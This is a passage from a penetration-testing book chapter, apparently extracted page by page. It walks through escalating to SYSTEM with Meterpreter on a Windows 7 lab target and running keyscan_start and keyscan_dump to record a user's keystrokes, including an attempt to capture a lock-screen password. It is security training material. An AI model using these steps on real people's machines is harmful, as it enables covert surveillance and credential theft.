  md: '# Chapter 23

    Keyscan, Lockout Keylogger, and Step Recorder


    When a penetration tester has remote access to a user''s machine, sometimes they
    find that it is beneficial to run a remote keyboard scanner. This tool is a program
    that runs silently in the background recording all the keys that a user presses.
    In this chapter we will look at two different ways to do this in Metasploit. Then
    we will look at turning Microsoft''s Problem Step Recorder into a remote recording
    "spy" tool.


    # Keylogging with Metasploit


    We will start this chapter by exploring Metasploit''s built in key scanner. Metasploit
    has a helpful set of Meterpreter commands for capturing keys pressed on a target
    machine.


    +   - Keyscan_dump

    - Keyscan_start

    - Keyscan_stop


    These commands are available through Meterpreter, so we will start with a system
    that we have already run an exploit on and were successful in creating a remote
    session. We will use our Windows 7 system as a target. We will need System level
    access, so after we get the remote session, we will have to run the Bypass UAC
    module and then run the **"getsystem"** command.


    ```

    meterpreter > getsystem

    ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

    meterpreter > getuid

    Server username: NT AUTHORITY\SYSTEM

    meterpreter >

    ```


    If we type **"help"** at the Meterpreter prompt we will be given a list of commands
    that we can run. For this section we are concerned with just the "keyscan" commands:


    ```

    keyscan_dump    Dump the keystroke buffer

    keyscan_start   Start capturing keystrokes

    keyscan_stop    Stop capturing keystrokes

    ```'
  merge: -1
  pgno: 319
- img_proc: false
  md: 'So, let''s go ahead and see what it looks like when we start a remote keylogger.
    Then we will view the captured key strokes.


    +   1. Simply type "**keyscan_start**" to start the remote logging.


    ```

    meterpreter > keyscan_start

    Starting the keystroke sniffer...

    meterpreter >

    ```


    In a real test we would then just need to wait until the target typed some things
    on the keyboard. For our example, go ahead and open your Windows 7 browser and
    perform a search in Google.


    +   2. Now back on the Kali system, to see what was typed simply enter "**keyscan_dump**":


    ```

    meterpreter > keyscan_dump

    Dumping captured keystrokes...

    google.com<CR>

    will dallas go to the super bowl next year<Right Shift>?<CR>

    ```


    Here you can see from this demo that our target user went to google.com and searched
    for "will dallas go to the super bowl next year?" Well, obviously our user is
    a sadly disappointed, but ever hopeful Dallas football fan. Let''s try one more
    thing. Notice it picked up the <Right Shift> and <CR> presses. What happens if
    the user uses other special keys like the Windows key? Also, what would happen
    if the user used the "*Windows*" + "*l*" key to lock his keyboard, and then used
    their password to get back in? Could we capture their password?


    +   3. Lock your Windows system with the "***Windows***" and "***L***" key.

    4. Log back in with the password.

    5. On the Kali system type "**keyscan_dump**" again:


    ```

    meterpreter > keyscan_dump

    Dumping captured keystrokes...

    <LWin> l

    meterpreter >

    ```'
